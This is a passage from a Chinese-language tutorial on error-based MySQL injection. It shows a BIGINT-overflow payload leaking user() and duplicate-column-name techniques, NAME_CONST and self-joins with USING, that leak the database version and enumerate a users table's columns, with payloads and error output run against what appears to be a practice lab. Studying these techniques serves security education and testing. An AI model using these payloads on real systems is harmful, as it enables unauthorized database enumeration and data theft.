| root@localhost  |
+-----------------+
1 row in set (0.00 sec)

mysql> select !(select user()); # 一次取反
+------------------+
| !(select user()) |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)

mysql> select !(select !(select user())); # 二次取反
+----------------------------+
| !(select !(select user())) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (0.00 sec)
```

最终构建payload：

```sql
mysql> select (select(!x-~0)from(select(select user())x)a); # x与a均省略AS关键字
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
```

### §3.1.4 列名重复注入

我们知道，一个表（`Table`）不允许包含两个名称相同的字段，但是一个子查询（`Subquery`）是可以的。如果我们把子查询看作一个表，作为`FROM`子句的参数，那么就会导致错误。这里我们使用`NAME_CONST(name,value)`函数创建临时列：

```sql
mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2));
    ERROR 1248 (42000): Every derived table must have its own alias # 报错，子查询作为表时必须指定别名

mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2)) AS x;
    ERROR 1060 (42S21): Duplicate column name 'HelloWorld' # HelloWorld被爆出来了

mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2))x; # 也可以忽略AS关键字
    ERROR 1060 (42S21): Duplicate column name 'HelloWorld'
```

我们发现错误信息中包含重复的列名。利用这一点，我们可以将payload放入列名中：

```sql
# 爆数据库版本
mysql> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
    ERROR 1060 (42S21): Duplicate column name '5.5.53'
```

然而高版本的[官方文档](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)明确表示，`name_const()`函数中的所有参数只能为常量，因此无法执行任意payload，所以该方法只适用于低版本（>5.0.12）：

> - `NAME_CONST(name,value)`
>
>   Returns the given value. When used to produce a result set column, NAME_CONST() causes the column to have the given name. **<u>The arguments should be constants</u>**.

既然`name_const()`行不通，那我们就试试用其他方法获取列名。例如每张表的列名就是现成的列名，我们可以爆列名：

```sql
mysql> select * from users a join users b; # 构建含有重复列名的Subquery
+----+----------+------------+----+----------+------------+
| id | username | password   | id | username | password   |
+----+----------+------------+----+----------+------------+
|  1 | Dumb     | Dumb       |  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |  1 | Dumb     | Dumb       |
| .. | ......   | ......     | .. | ......   | ......     |
| 14 | admin4   | admin4     | 14 | admin4   | admin4     |
+----+----------+------------+----+----------+------------+

mysql> select * from (select * from users a join users b) c;
	ERROR 1060 (42S21): Duplicate column name 'id' # 爆出一个名为id的字段
```

但是这样只能爆出一个字段。于是我们使用`USING`子句删除已知名称的字段：

```sql
mysql> select * from users a join users b using(id);
+----+----------+------------+----------+------------+
| id | username | password   | username | password   |
+----+----------+------------+----------+------------+
|  1 | Dumb     | Dumb       | Dumb     | Dumb       |
| .. | ......   | ......     | ......   | ......     |
| 14 | admin4   | admin4     | admin4   | admin4     |
+----+----------+------------+----------+------------+
13 rows in set (0.00 sec)

mysql> select * from users a join users b using(id,username);
+----+----------+------------+------------+
| id | username | password   | password   |
+----+----------+------------+------------+
|  1 | Dumb     | Dumb       | Dumb       |
| .. | ......   | ......     | ......     |
| 14 | admin4   | admin4     | admin4     |
+----+----------+------------+------------+
13 rows in set (0.00 sec)

mysql> select * from users a join users b using(id,username,password);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| .. | ......   | ......     |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

这样我们就可以逐个爆出所有的列名了：

```sql
mysql> select * from (select * from users a join users b) c;
    ERROR 1060 (42S21): Duplicate column name 'id' # 爆出列名id

mysql> select * from (select * from users a join users b using(id)) c;
    ERROR 1060 (42S21): Duplicate column name 'username' # 爆出列名username

mysql> select * from (select * from users a join users b using(id,username)) c;
    ERROR 1060 (42S21): Duplicate column name 'password' # 爆出列名password

mysql> select * from (select * from users a join users b using(id,username,password)) c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| .. | ........ | .......... |
| 14 | admin4   | admin4     |
+----+----------+------------+ # 不报错，说明列名全都爆完了
```

